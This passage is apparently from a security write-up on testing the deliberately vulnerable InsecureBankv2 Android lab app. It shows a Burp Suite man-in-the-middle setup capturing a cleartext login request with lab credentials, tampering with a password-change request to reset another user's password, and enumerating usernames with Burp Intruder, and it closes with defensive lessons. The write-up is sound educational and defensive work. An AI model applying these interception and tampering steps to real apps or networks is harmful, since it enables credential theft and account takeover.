The app talks to the AndroLab backend over plain HTTP, so anyone on the path can read and modify the traffic. I set up Burp Suite as a man-in-the-middle. The mechanism is a single meeting point — one IP and one port — configured identically on both sides: Burp *listens* there, and the device *sends* there.

I created a Burp proxy listener bound to my host-only adapter address (`192.168.56.1`) on a chosen port:

![Burp Suite proxy listener bound to the host-only address 192.168.56.1](/assets/img/Mobile/InsecureBankv2/cap10.png)

Then I set a manual proxy on the emulator's Wi-Fi settings pointing at the *same* IP and port:

![Android manual Wi-Fi proxy pointing at the host-only address and Burp port](/assets/img/Mobile/InsecureBankv2/cap11.png)

The only address that matters is the host's IP on the host-only network — it goes identically in both places. With both configured, every request the app makes is routed through Burp. Logging in reveals the credentials in plaintext in the request body:

![Burp intercepting the POST /login request with username and password in cleartext](/assets/img/Mobile/InsecureBankv2/cap12.png)

The captured request shows exactly why HTTP is unacceptable for authentication:

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 192.168.56.1:8888

username=jack&password=Jack%40123%24
```

The credentials (`jack` / `Jack@123$`, URL-encoded) travel in the clear. Any attacker on the same network — a rogue access point, a compromised router, ARP spoofing on public Wi-Fi — reads them without touching the device. This works cleanly here precisely because the traffic is unencrypted; had the app used HTTPS, interception would additionally require installing Burp's CA certificate on the device and, in a hardened app, defeating certificate pinning.


## Parameter Manipulation & User Enumeration

**Objective**: change another user's password by tampering with the request, and enumerate valid usernames from the differing responses.

The Change Password feature submits the target username and the new password to the server. Because that username is client-supplied and the server doesn't verify it against the authenticated session, intercepting the request in Burp and swapping the username changes a *different* user's password — a straightforward parameter-manipulation / broken-access-control flaw.

The same request feeds a user-enumeration attack. Sent to Burp Intruder with the username as a Sniper payload position and a wordlist of candidate usernames, the responses differ by whether the account exists: a valid username (like `jack`) returns a success response, while a non-existent one (like `admin`) returns an error. Response status or length becomes a reliable oracle for which usernames are real — a list an attacker then feeds into password attacks against the endpoints that *do* verify credentials.


## Key Takeaways

- **Exported components are an authentication bypass waiting to happen.** An activity, provider, or receiver marked `exported="true"` can be invoked by any app on the device, ignoring whatever flow was supposed to precede it. Authorisation has to be enforced inside each component, never assumed from the order screens are reached in.

- **Client-side flags and checks are not a security boundary.** The `is_admin` resource, the `devadmin` backdoor routing, and the root-detection methods all live in code the attacker can read and rewrite. Any decision a client makes about its own privileges can be inverted by repackaging or runtime instrumentation — the real boundary is the server.

- **Encryption with a hardcoded key and static IV is obfuscation, not cryptography.** A key shipped inside every APK is a public key, and a constant IV makes identical plaintexts produce identical ciphertexts. Storing secrets this way is equivalent to storing them in cleartext to anyone who reads the class. Use the Android Keystore with per-device keys, and don't store passwords recoverably at all.

- **One sensitive artifact, many unguarded doors.** The user database and stored credentials in this app are reachable through the content provider, `adb backup`, and `run-as` independently. Hardening a mobile app means closing every path to the data, not just the most obvious one — a single leftover `debuggable=true` or `allowBackup=true` undoes the rest.

- **Manifest flags carry outsized risk and belong in CI.** `debuggable=true` and `allowBackup=true` are one-line mistakes with large blast radii, and both are trivially caught by static analysis. A build-time gate that rejects them costs nothing and prevents the whole `run-as` / backup exfiltration class.

- **Capability is not the same as exploitability, and both belong in the report.** The backup, clipboard, and logging flaws are all mitigated to different degrees on modern Android (12+ backup restrictions, Android 10+ clipboard focus checks, post-4.1 log isolation). The honest finding states the underlying design flaw *and* the version-dependent conditions under which it's actually exploitable, rather than crying critical or dismissing it outright.

- **Cleartext HTTP and cleartext logging expose credentials to attackers who never touch the app's code.** Plain HTTP hands passwords to anyone on the network path; logging them hands them to anyone who can read the log buffer. Both are eliminated by discipline — HTTPS with a cleartext-forbidding network config, and never logging secrets in the first place.
